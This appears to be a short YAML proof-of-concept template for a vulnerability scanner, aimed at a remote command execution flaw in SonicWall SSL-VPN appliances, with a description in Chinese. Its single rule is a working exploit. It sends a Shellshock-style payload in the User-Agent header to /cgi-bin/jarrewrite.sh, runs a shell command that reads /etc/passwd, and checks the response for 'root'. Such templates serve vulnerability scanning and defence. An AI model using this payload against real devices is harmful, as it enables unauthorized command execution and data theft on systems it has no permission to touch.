name: SonicWall SSL-VPN 远程命令执行漏洞
transport: http
set: {}
detail:
  dock: (app="SonicWALL-Company's-product" || app="SonicWALL-SSL-VPN")
  product: SonicWall SSL-VPN
  homepage: https://www.sonicwall.com/
  impact: <p>🐏</p>
  description: SonicWall SSL-VPN 远程命令执行在1月24日被公开 EXP，此设备存在远程命令执行漏洞
rules:
  r1:
    method: GET
    path: /cgi-bin/jarrewrite.sh
    follow_redirects: true
    headers:
      User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
    expression: response.status == 200 && response.body.bcontains(b'root')
expression: r1()
